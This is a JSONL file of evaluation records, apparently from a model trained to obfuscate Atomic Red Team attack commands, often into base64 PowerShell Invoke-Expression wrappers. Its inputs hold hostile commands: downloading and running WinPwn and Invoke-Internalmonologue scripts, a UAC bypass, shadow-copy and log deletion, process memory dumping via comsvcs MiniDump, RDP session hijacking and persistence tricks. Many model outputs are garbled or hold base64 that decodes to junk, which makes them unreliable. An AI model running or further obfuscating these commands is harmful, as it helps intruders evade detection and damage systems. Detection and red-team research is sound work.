{"input": "dscl . -create /Users/#{username}\ndscl . -create /Users/#{username} UserShell /bin/zsh\ndscl . -create /Users/#{username} RealName \"#{realname}\"\ndscl . -create /Users/#{username} UniqueID \"1010\"\ndscl . -create /Users/#{username} PrimaryGroupID 80\ndscl . -create /Users/#{username} NFSHomeDirectory /Users/#{username}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZHNjbCAuIC1jcmVhdGUgL1VzZXJzLyN7dXNlcm5hbWV9CmRzY2wgLiAtY3JlYXRlIC9Vc2Vycy8je3VzZXJuYW1lfSBVc2VyU2hlbGwgL2Jpbi96c2gKZHNjbCAuIC1jcmVhdGUgL1VzZXJzLyN7dXNlcm5hbWV9IFJlYWxOYW1lICIje3JlYWxuYW1lfSIKZHNjbCAuIC1jcmVhdGUgL1VzZXJzLyN7dXNlcm5hbWV9IFVuaXF1ZUlEICIxMDEwIgpkc2NsIC4gLWNyZWF0ZSAvVXNlcnMvI3t1c2VybmFtZX0gUHJpbWFyeUdyb3VwSUQgODAKZHNjbCAuIC1jcmVhdGUgL1VzZXJzLyN7dXNlcm5hbWV9IE5GU0hvbWVEaXJlY3RvcnkgL1VzZXJzLyN7dXNlcm5hbWV9')) | Invoke-Expression\"", "output_model": "dscl . -create /Users/ UserShell /bin/zsh dscl . -create /Users/ RealName \"\" dscl . -create /Users/ UniqueID 1010 dscl . -create /Users/ PrimaryGroupID 80 dscl . -create /Users/<|"}
{"input": "Start-Process -FilePath \"$Env:ProgramFiles\\Process Hacker 2\\#{processhacker_exe}\"", "output_expected": "Start-Process $Env:ProgramFiles\\Process Hacker 2\\", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhdHVzLmNvbW1vbi5leGFtcGxlfQ==')) | Invoke-Expression\""}
{"input": "ipconfig /all\nnet config workstation\nnet view /all /domain\nnltest /domain_trusts\n", "output_expected": "ipconfig /all\nnet config workstation\nnet view /all /domain\nnltest /domain_trusts", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIC9wYXJhbGl0aWVzCm5ldCB7IGZvciB0cnVlfSIgL3NvdXJjZUxpbmtzID0gc2FtZXQgKHdlbmVyYXRlcy"}
{"input": "[ \"$(uname)\" = 'FreeBSD' ] && encodecmd=\"b64encode -r -\" && decodecmd=\"b64decode -r\" || encodecmd=\"base64 -w 0\" && decodecmd=\"base64 -d\"\nART=$(echo -n \"id\" | $encodecmd)\necho \"\\$ART=$ART\"\necho -n \"$ART\" | $decodecmd |/bin/bash\nunset ART\n", "output_expected": "[ $(uname) = 'FreeBSD' ] && encodecmd=\"b64encode -r -\" && decodecmd=\"b64decode -r\" || encodecmd=\"base64 -w 0\" && decodecmd=\"base64 -d\" ART=$(echo -n id | $encodecmd) echo \\$ART=$ART echo -n $ART | $decodecmd |/bin/bash unset ART", "output_model": "[ ]&&encodecmd=b64encode-r-&&decodecmd=b64decode-r||encodecmd=base64-w0--base64-d--bin-bashunsetARTOM$(echo-nid|b64encode-r-)<|$decodecmd|/bin/bash"}
{"input": "net accounts /domain\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bmV0IGFjY291bnRzIC9kb21haW4=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje1N0YXRzIHJlbmFtZW5hbCAic2hlcmUiIC9wYWNrZXQvc2NyaXB0fQ==')) | Invoke-Expression\""}
{"input": "mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bXNodGEuZXhlIGphdmFzY3JpcHQ6YT0oR2V0T2JqZWN0KCdzY3JpcHQ6I3tmaWxlX3VybH0nKSkuRXhlYygpO2Nsb3NlKCk7')) | Invoke-Expression\"", "output_model": "mshta.exe javascript:a=(GetObject('script:'   \\\"\\\"\\\"\\\"   ,'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.007/src/js/calc.sct\"\"\\\"'))).Exec();close();"}
{"input": "networksetup -setwebproxy #{interface} #{proxy_server} #{proxy_port}\nnetworksetup -setsecurewebproxy #{interface} #{proxy_server} #{proxy_port}\n", "output_expected": "networksetup", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2NvcGUgLWNvbmZpcm1hdGlvbiAiIC9kYXRhOlBhdGhfVGVzdC5QbHV0aFxTdHJpbmdDb2xsZW1lbnRzIjsKZnV"}
{"input": "Start-Process \"#{webbrowserpassview_path}\"\nStart-Sleep -Second 4\nStop-Process -Name \"WebBrowserPassView\"\n", "output_expected": "Start-Process", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQgIiN7ZWNobyAje2xvbmdydW5uaW9uX3Byb2R1Y3QnICVcKSAkJSVdCfSI=')) | Invoke-Expression\""}
{"input": "xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC}", "output_expected": "xwizard {00000001-0000-0000-0000-0000FEEDACDC} RunWizard", "output_model": "\"xwizard \"RunWizard\" {00000001-0000-0000-0000-0000FEEDACDC}\""}
{"input": "mkdir -p /tmp/atomic-test-T1036.006\ncd /tmp/atomic-test-T1036.006\nmkdir -p 'testdirwithspaceend '\n[ \"$(uname)\" = 'FreeBSD' ] && /bin/echo \"#\\!/bin/sh\" > \"testdirwithspaceend /init \" && echo 'echo \"print(\\\"running T1035.006 with space after filename to masquerade init\\\")\" | python3.9' >> \"testdirwithspaceend /init \" && echo \"exit\" >> \"testdirwithspaceend /init \" || /usr/bin/echo -e \"%d\\na\\n#!/usr/bin/perl\\nprint \\\"running T1035.006 with space after filename to masquerade init\\\\n\\\";\\nqx/cp \\/usr\\/bin\\/perl 'init  '/;\\nqx/'.\\/init  ' -e 'sleep 5'/;\\n.\\nwq\\n\" | ed 'testdirwithspaceend /init ' >/dev/null\nchmod +x 'testdirwithspaceend /init '\n'./testdirwithspaceend /init '\n", "output_expected": "mkdir -p /tmp/atomic-test-T1036.006 cd /tmp/atomic-test-T1036.006 mkdir -p 'testdirwithspaceend ' [ $(uname) = 'FreeBSD' ] && /bin/echo", "output_model": "mkdir -p /tmp/atomic-test-T1036.006 cd /tmp/atomic-test-T1036.006 mkdir -p testdirwithspaceend [ $(uname) = FreeBSD ] && /bin/echo \"#! /bin/sh\" > testdirwithspaceend /init && echo 'echo \"print(\"running T1035.006 with space after filename to masquerade"}
{"input": "$Server=#{logonserver}\n$User = Join-Path #{domain} #{username}\n$Password=\"#{password}\"\ncmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password\nmstsc /v:$Server\necho \"RDP connection established\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JFNlcnZlcj0je2xvZ29uc2VydmVyfQokVXNlciA9IEpvaW4tUGF0aCAje2RvbWFpbn0gI3t1c2VybmFtZX0KJFBhc3N3b3JkPSIje3Bhc3N3b3JkfSIKY21ka2V5IC9nZW5lcmljOlRFUk1TUlYvJFNlcnZlciAvdXNlcjokVXNlciAvcGFzczokUGFzc3dvcmQKbXN0c2MgL3Y6JFNlcnZlcgplY2hvICJSRFAgY29ubmVjdGlvbiBlc3RhYmxpc2hlZCI=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGQgcHJvdG9jb2wgI3tzdXBwbHkgYW5kIFN1YiAje3ByaXZhdGVyIC90d2lsaXM=')) | Invoke-Expression\"\n##"}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nUACBypass -noninteractive -command \"C:\\windows\\system32\\cmd.exe\" -technique magic", "output_expected": "iex(new-object \\\"net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\\\" UACBypass -noninteractive -command \"C:\\windows\\system32\\cmd.exe\" -technique magic", "output_model": "iex(new-object net.webclient).downloadstring(\"https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1\") UACBypass -noninteractive -command C:\\windows\\system3"}
{"input": "dsenableroot #current user\ndsenableroot -u art-tester -p art-tester -r art-root #new user", "output_expected": "dsenableroot", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IGNhc2UgI3tleSBleGFtcGxlLmNvbTogMTBzOiB7IC1hY3Rpb25fbmV0YS1wcm9kdWN0fQ==')) | Invoke-Expression\"<"}
{"input": "echo '' > /var/log/messages\n", "output_expected": "echo '' > /var/log/messages", "output_model": "echo ''' > /var/log/messages'"}
{"input": "regasm.exe {PATH:.dll}", "output_expected": "\"regasm.exe\" {PATH:.dll}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIC90aXRsZW5zL2hvbGFucy9Qb3NpdGVfYWRkaXRvciAje21vdHJpbmcgI3tleSAicmVzdGE=')) | Invoke-Expression\"<|endof"}
{"input": "wuauclt.exe /UpdateDeploymentProvider {PATH_ABSOLUTE:.dll} /RunHandlerComServer", "output_expected": "wuauclt.exe /UpdateDeploymentProvider {PATH_ABSOLUTE:.dll} \"/RunHandle\"rComServer", "output_model": "wuauclt.exe /UpdateDeploymentProvider {PATH_ABSOLUTE:.dll} /RunHandlerComServer"}
{"input": "curl -k #{ip_lookup_url}\n", "output_expected": "curl", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bG9jYWxob3N0IGNvbmZpcm1hdGlvbiAtIHtleGVjdXRlciAtLW5hbWVzc2FuZGFyZC1wYXJ0aWNz')) | Invoke-Expression\"<|"}
{"input": "vssadmin.exe delete shadows /all /quiet\n", "output_expected": "\\\"vssadmin.exe\\\" delete shadows /all /quiet", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVzdHJ1Y3RlcicgL2FwcGxpY2F0aW9uIiAtICN7ZmlsZXMvbWFpbnxjfQ==')) | Invoke-Expression\"\n```"}
{"input": "diskshadow.exe /s {PATH:.txt}", "output_expected": "diskshadow.exe {PATH:.txt} /s", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQgZGF0YSAtICN7d2luZG93LmV4YW1wbGVzcCAkIHsgJiB7XC5maWxlfSI=')) | Invoke-Expression\"\n##"}
{"input": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyEnable /t REG_DWORD /d 1 /f\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCAiSEtDVVxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxJbnRlcm5ldCBTZXR0aW5ncyIgL3YgUHJveHlFbmFibGUgL3QgUkVHX0RXT1JEIC9kIDEgL2Y=')) | Invoke-Expression\"", "output_model": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings /v ProxyEnable /t REG_DWORD /d 1 /f"}
{"input": "rd /s /q %systemdrive%\\$RECYCLE.BIN\n", "output_expected": "rd /s /q %systemdrive%\\$RECYCLE.BIN", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIG9wZW5NdXJyZW50IHRoaXMgL3RtcCAtIC1jb2xvciAje2FjY2Vzcwp7fSBMaWxl')) | Invoke-Expression\""}
{"input": "expand {PATH_SMB:.bat} {PATH_ABSOLUTE}:file.bat", "output_expected": "expand {PATH_SMB:.bat} \\\"{PATH_ABSOLUTE}:file.bat\\\"", "output_model": "expand {PATH_SMB:.bat} {PATH_ABSOLUTE}:file.bat\nexpand {PAT\"H,SMB:.bat} {PATH_ABSOLUTE}:file.bat\nexpand {PATH_SMB:.bat} {\"PA\"\"TH_A\"\"BSOLUTE\":file.bat}\nexpand {PAT\""}
{"input": "Copy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\vbsstartup.vbs\" \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\"\nCopy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\vbsstartup.vbs\" \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\"\ncscript.exe \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\"\ncscript.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\"\n", "output_expected": "Copy-Item C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs $env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs Copy-Item $PathToAtomicsFolder\\T1547.001\\src\\vbsstartup.vbs C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs cscript.exe $env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs cscript.exe $PathToAtomicsFolder\\T1547.001\\src\\vbsstartup.vbs", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R3JvdXA9bGlzdF9jb2xhcnQucHVibGljLmNvbS5zZWNyZWdpY2gub3JnIiAvdGVtcGxhdGUtbWFpbHRvcnl9')) | Invoke-Expression\""}
{"input": "$env:COR_ENABLE_PROFILING = 1\n$env:COR_PROFILER = '#{clsid_guid}'\n$env:COR_PROFILER_PATH = '\"#{file_name}\"'\nPOWERSHELL -c 'Start-Sleep 1'\n", "output_expected": "\\\"$env:COR_ENABLE_PROFILING\\\" = 1 $env:COR_PROFILER = '", "output_model": "$env:COR_ENABLE_PROFILI=ng 1 $env:COR_PROFILER='''\"d53e8576-249e-11da-a36b-0008cs,msft\";$env:COR_PROFILER_PATH=''\"\"\"\"\"\"\",msft\";powershell -c"}
{"input": "rundll32.exe {PATH},EntryPoint", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnVuZGxsMzIuZXhlIHtQQVRIfSxFbnRyeVBvaW50')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGlzIHN0YXR1cw==')) | Invoke-Expression\""}
{"input": "echo '#{command_to_add}' >> ~/.shrc\n", "output_expected": "echo '", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiI2RldmVsb3BlciAtIC97bGFzcyIgLXNlcnZpY2UgLW5hbWUSC1JHQ0VfUk9MRUNUSCAkcX1BLAklMAlRpdGxl"}
{"input": "$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore)\nif($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }\nC:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump $id $env:TEMP\\svchost-exe.dmp full\n", "output_expected": "$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore) if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id } rundll32 comsvcs.dll, MiniDump $id $env:TEMP\\svchost-exe.dmp full", "output_model": "$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore) if($ps){$id = $ps[0].OwningProcess} else {(Get-Process svchost)[0].Id } C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump $id $env:TEMP\\"}
{"input": "PROMPT_COMMAND='history -a >(tee -a ~/.bash_history |logger -t \"$USER[$$] $SSH_CONNECTION \")'\necho \"\\$PROMPT_COMMAND=$PROMPT_COMMAND\"\ntail /var/log/syslog\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAUABSAE8ATQBQAFQAXwBDAE8ATQBNAEEATgBEAD0AJwBoAGkAcwB0AG8AcgB5ACAALQBhACAAPgAoAHQAZQBlACAALQBhACAAfgAvAC4AYgBhAHMAaABfAGgAaQBzAHQAbwByAHkAIAB8AGwAbwBnAGcAZQByACAALQB0ACAAIgAkAFUAUwBFAFIAWwAkACQAXQAgACQAUwBTAEgAXwBDAE8ATgBOAEUAQwBUAEkATwBOACAAIgApACcACgBlAGMAaABvACAAIgBcACQAUABSAE8ATQBQAFQAXwBDAE8ATQBNAEEATgBEAD0AJABQAFIATwBNAFAAVABfAEMATwBNAE0AQQBOAEQAIgAKAHQAYQBpAGwAIAAvAHYAYQByAC8AbABvAGcALwBzAHkAcwBsAG8AZwA=", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q29weXJhdGlvblxBdHRyaWJ1dGVzU3RyZWFtaW5nKCk7cmlnaHQgLWYgfSB7YWR2X2NvbWVtZW50IiAje2luZm"}
{"input": "sudo cp #{path_malicious_plist} /Library/LaunchDaemons/#{plist_filename}\nsudo launchctl load -w /Library/LaunchDaemons/#{plist_filename}\n", "output_expected": "sudo", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnBzLmNvbSAtZXhlYy9pbmRleC5leGU=')) | Invoke-Expression\""}
{"input": "TEST=$(echo $HISTFILESIZE)\necho $HISTFILESIZE\nexport HISTFILESIZE=0\necho \"runnning some commands to populate the history\"\nwhoami\ngroups\nif [ $(echo $HISTFILESIZE) -eq 0 ]; then echo \"\\$HISTFILESIZE is zero\"; else HIST_LENGHT=$(wc -l $HISTFILE); echo \"\\$HISTFILESIZE is not zero, history lenght is $HIST_LENGHT\";  fi\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('VEVTVD0kKGVjaG8gJEhJU1RGSUxFU0laRSkKZWNobyAkSElTVEZJTEVTSVpFCmV4cG9ydCBISVNURklMRVNJWkU9MAplY2hvICJydW5ubmluZyBzb21lIGNvbW1hbmRzIHRvIHBvcHVsYXRlIHRoZSBoaXN0b3J5Igp3aG9hbWkKZ3JvdXBzCmlmIFsgJChlY2hvICRISVNURklMRVNJWkUpIC1lcSAwIF07IHRoZW4gZWNobyAiXCRISVNURklMRVNJWkUgaXMgemVybyI7IGVsc2UgSElTVF9MRU5HSFQ9JCh3YyAtbCAkSElTVEZJTEUpOyBlY2hvICJcJEhJU1RGSUxFU0laRSBpcyBub3QgemVybywgaGlzdG9yeSBsZW5naHQgaXMgJEhJU1RfTEVOR0hUIjsgIGZp')) | Invoke-Expression\"", "output_model": "TEST=$(echo $HISTFILESIZE)\necho $HISTFILESIZE\nexport HISTFILESIZE=0\necho \"runnning some commands to populate the history\"\nwhoami\ngroups\nif [ $(echo $HISTFILESIZE) -eq 0 ]; then echo \"$HISTFILESIZE is zero\"; else HIST_LENGHT=$(wc -l $HISTFILE); echo \"$HISTFILESIZE is not zero, history lenght is $H"}
{"input": "sdbinst.exe \"#{file_path}\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2RiaW5zdC5leGUgIiN7ZmlsZV9wYXRofSI=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2NhbGFuZy9UaHJvYWRzLm5ldCAkdXBncmVfdGVzdC5leGUgI3t7c3BlY2lmaWNhdGlvbiAtMTMiIC1jIG1haWx0Z"}
{"input": "wmic process call create #{process_to_execute}\n", "output_expected": "wmic --process --call --create", "output_model": "\"wmic\" \"process\" \"call\" \"create\"   \"\"    \"\">\"p\"\"r\"\"o\"\"c\"\"e\"\"s\"\"s\"\"  \"\"c\"\"a\"\"l\"\"l\"\" \"\"\"cr\"\"e\"\"a\"\"t\"\"e\"\" \"#{process_to_execute}\""}
{"input": "[ \"$(uname)\" = 'FreeBSD' ] && cmd=\"lastlogin\" || cmd=\"lastlog\" \n$cmd > #{output_file}\ncat #{output_file}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('WyAiJCh1bmFtZSkiID0gJ0ZyZWVCU0QnIF0gJiYgY21kPSJsYXN0bG9naW4iIHx8IGNtZD0ibGFzdGxvZyIgCiRjbWQgPiAje291dHB1dF9maWxlfQpjYXQgI3tvdXRwdXRfZmlsZX0=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2V0LUlEIC1QdGFibGVzX3Byb3ZpZGVyJykKIiN7eyJwYWRkaW5nIjoie1wiZmlyc3RfcHVzaCIsIm9wbmciOjEsInJ"}
{"input": "echo \"\" | \"#{plink_file}\" -batch \"#{vm_host}\" -ssh -l #{vm_user} -pw \"#{vm_pass}\" \"for i in `vim-cmd vmsvc/getallvms | awk 'NR>1 {print $1}'`; do vim-cmd vmsvc/power.off $i & done\"\n", "output_expected": "echo \"\" | \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyB0aHVtYm9vdHNcT25ldGFkX3RpbWUgKGNhcnJlbmRzfSB7IHNvbWUuZXhlIGFycmF5cyAje2V0dGVzdCxle"}
{"input": "cmd.exe /c \"wmic \tcsproduct \tget UUID\" \ncmd.exe /c \"fsutil behavior \tset SymlinkEvaluation R2L:1\" \ncmd.exe /c \"fsutil behavior set \tSymlinkEvaluation R2R:1\"\nreg    add    HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters    /v MaxMpxCt /d 65535 /t REG_DWORD /f      \ncopy \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" $env:temp\ncmd.exe /c \"$env:temp\\psexec.exe  -accepteula  \\\\#{targethost} cmd.exe  /c echo \"--access-token\"\"\n", "output_expected": "cmd.exe /c \"wmic csproduct get UUID\" cmd.exe /c \"fsutil behavior set SymlinkEvaluation R2L:1\" cmd.exe /c \"fsutil behavior set SymlinkEvaluation R2R:1\" reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters /v MaxMpxCt /d 65535 /t REG_DWORD /f copy \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" \"$\"\"e\"\"n\"\"v\"\":\"\"t\"\"e\"\"m\"\"p\" cmd.exe /c \"$env:temp\\psexec.exe -accepteula \\\\", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('YWRtaW4ucHJpbWl0aXZlIC9hbGxvd19zZWNyZXQvc2VydmVyLmNvbT4gIiB7eyAicGVycm9yX2luX2FjY2Vzcy"}
{"input": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=group) #{optional_args}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('IlBhdGhUb0F0b21pY3NGb2xkZXJcLi5cRXh0ZXJuYWxQYXlsb2Fkc1xBZEZpbmQuZXhlIiAtZiAob2JqZWN0Y2F0ZWdvcnk9Z3JvdXApICN7b3B0aW9uYWxfYXJnc30=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JERlcGxveW1lbnQgLUFjY2VzcyAje0RvbWFpbi5Db2luIiN7ZXhlIGtleSIsIC1hbmd1bGFyMiIKICAgICAgImJvZHkK"}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1')\nInvoke-Internalmonologue -command \"-Downgrade true -impersonate true -restore true\"", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4KG5ldy1vYmplY3QgbmV0LndlYmNsaWVudCkuZG93bmxvYWRzdHJpbmcoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9TM2N1cjNUaDFzU2gxdC9Qb3dlclNoYXJwUGFjay9tYXN0ZXIvUG93ZXJTaGFycEJpbmFyaWVzL0ludm9rZS1JbnRlcm5hbG1vbm9sb2d1ZS5wczEnKQpJbnZva2UtSW50ZXJuYWxtb25vbG9ndWUgLWNvbW1hbmQgIi1Eb3duZ3JhZGUgdHJ1ZSAtaW1wZXJzb25hdGUgdHJ1ZSAtcmVzdG9yZSB0cnVlIg==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW5hcHlzZXJ2YQ==')) | Invoke-Expression\"\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/"}
{"input": "poweroff --reboot\n", "output_expected": "poweroff \\\"-\\\"\\\"-\\\"\\\"r\\\"\\\"e\\\"\\\"b\\\"\\\"o\\\"\\\"o\\\"\\\"t\\\"", "output_model": "poweroff --reboot"}
{"input": "HH.exe {REMOTEURL:.chm}", "output_expected": "HH.exe {REMOTEURL:.chm}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q291cnNlc0RvY2tlci5leGUgLWVhbCB7ZmlsZX0=')) | Invoke-Expression\""}
{"input": "export HISTCONTROL=ignoreboth\n#{evil_command}\n", "output_expected": "\"export\" HISTCONTROL=ignoreboth", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IC1HQkYgI3tmaWxlfSAje2luIC9hIGFzIE5leGUgKiAje2luIC9wIC9pbnB1dCAtcDsgPSB7bmV0cnkgPSAvYml"}
{"input": "start ms-appinstaller://?source={REMOTEURL:.exe}", "output_expected": "start ms-appinstaller://?source={REMOTEURL:.exe}", "output_model": "start ms-appinstaller://?source={REMOTEURL:.exe}\n```\n## Atomic Test No. 2 - Start an application with a malicious appx file - Powershell\nStart an application with a malicious appx file via ms-appx-web URL scheme.\n**Supported Platforms:** Windows"}
{"input": "busybox sh &", "output_expected": "busybox sh &", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2NvbXBhbnl9IGZhaWx1bj0iI3tldGNrICJodHRwczovL3d3dy5zdGFnaWFzLmNvbS9hdWRpdC91cmwxMDQvY2"}
{"input": "query user\nsc.exe create sesshijack binpath= \"cmd.exe /k tscon #{Session_ID} /dest:#{Destination_ID}\"\nnet start sesshijack\n", "output_expected": "query create sesshijack binpath= cmd.exe /k tscon", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGJ5IC10b3AubG9jYWxob3N0IHsgR2F5cGVyfSB7ZXhwZWN0cyBDb21tYW5kLmVzZXJpbmFyeSAtIFRoaXM"}
{"input": "Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Userinit\" \"Userinit.exe, #{binary_to_execute}\" -Force\n", "output_expected": "Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Userinit\" \"Userinit.exe, \\\"", "output_model": "Set-ItemProperty HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ Userinit \\\"Userinit.exe\\\", -Force Set-ItemProperty HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ Userinit \\\"Userinit.exe\\\", -Force"}
{"input": "cmstp.exe /ni /s {PATH_ABSOLUTE:.inf}", "output_expected": "cmstp.exe /ni /s {PATH_ABSOLUTE:.inf}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje21hbGxvICN7dHJpbXRfZmlsZW5hbWUiIHtQYXRoIFBhdGg=')) | Invoke-Expression\""}
{"input": "echo '' > /var/log/messages\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAnJyA+IC92YXIvbG9nL21lc3NhZ2Vz')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBhbGVkIGFzY2VudC5leGUgLy9jb3N0IC1pbXBvcnQ+')) | Invoke-Expression\""}
